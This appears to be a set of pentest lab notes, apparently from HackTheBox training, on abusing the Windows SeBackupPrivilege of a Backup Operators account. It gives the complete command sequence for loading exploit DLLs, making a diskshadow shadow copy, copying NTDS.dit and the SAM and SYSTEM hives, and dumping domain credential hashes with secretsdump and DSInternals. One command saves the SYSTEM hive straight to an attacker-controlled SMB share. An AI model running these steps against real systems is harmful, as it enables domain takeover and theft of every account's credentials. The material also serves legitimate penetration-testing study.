# Backup Operators member
## SeBackup and SeRestore Privileges
This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the `FILE_FLAG_BACKUP_SEMANTICS` flag
1. Use this exploit to exploit the `SeBackupPrivilege`
```
https://github.com/giuliano108/SeBackupPrivilege
```
2. upload both files to the host machine
3. SeBackupPrivilegeUtils.dll
```
*Evil-WinRM* PS C:\Users\svc_backup> import-module .\SeBackupPrivilegeUtils.dll
```
4. SeBackupPrivilegeCmdLets.dll
```
*Evil-WinRM* PS C:\Users\svc_backup> import-module .\SeBackupPrivilegeCmdLets.dll
```
5. Create the following `vss.dsh`
```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```
6. upload to host machine
7. Start smb server on attack machine
```
sudo impacket-smbserver share . -smb2support -user df -password df
```
```
*Evil-WinRM* PS C:\Users\svc_backup> net use \\10.10.14.9\share /u:df df
```
```
reg.exe save hklm\system \\10.10.14.14\system
```
8. Dump NTDS.dit hashes 
```
root@kali# secretsdump.py -system system -ntds ntds.dit LOCAL
```

## Check if SeBackupPrivilege is enabled
```
whoami /priv
```
```
PS C:\htb> Get-SeBackupPrivilege
```
### If it is disabled
Importing Libraries
```
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
```
```
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
```
PS C:\htb> Set-SeBackupPrivilege
```
```
PS C:\htb> Get-SeBackupPrivilege
```
```
whoami /priv
```
### SeBackupPrivilege is Enabled, then we can do the following:
#### 1. Copying a Protected File, Contract.txt in this example
```
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```
**NOTE: you need to be in a folder where you have write permissions, like the user directory**
#### 2. Attacking a Domain Controller - Copying NTDS.dit
1. As the NTDS.dit file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy won't be in use by the system.
```
PS C:\htb> diskshadow.exe
```
```
DISKSHADOW> set verbose on
```
```
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
```
```
DISKSHADOW> set context clientaccessible
```
```
DISKSHADOW> set context persistent
```
```
DISKSHADOW> begin backup
```
```
DISKSHADOW> add volume C: alias cdrive
```
```
DISKSHADOW> create
```
```
DISKSHADOW> expose %cdrive% E:
```
```
DISKSHADOW> end backup
```
```
DISKSHADOW> exit
```
2. **E:\ created**
##### 2.1 Copying NTDS.dit Locally (Copy-FileSeBackupPrivilege or Robocopy)
Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.
```
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Extracting Credentials from NTDS.dit (PowerShell or SecrestDump) administrator account in this example
###### PowerShell 
```
PS C:\htb> Import-Module .\DSInternals.psd1
```
```
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
```
```
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
###### SecretsDump
```
d0x777@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
###### Robocopy
```
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
#### 3. Backing up SAM and SYSTEM Registry Hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py
```
reg save HKLM\SYSTEM SYSTEM.SAV
```
```
reg save HKLM\SAM SAMSAV
```
It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the FILE_FLAG_BACKUP_SEMANTICS flag is specified.
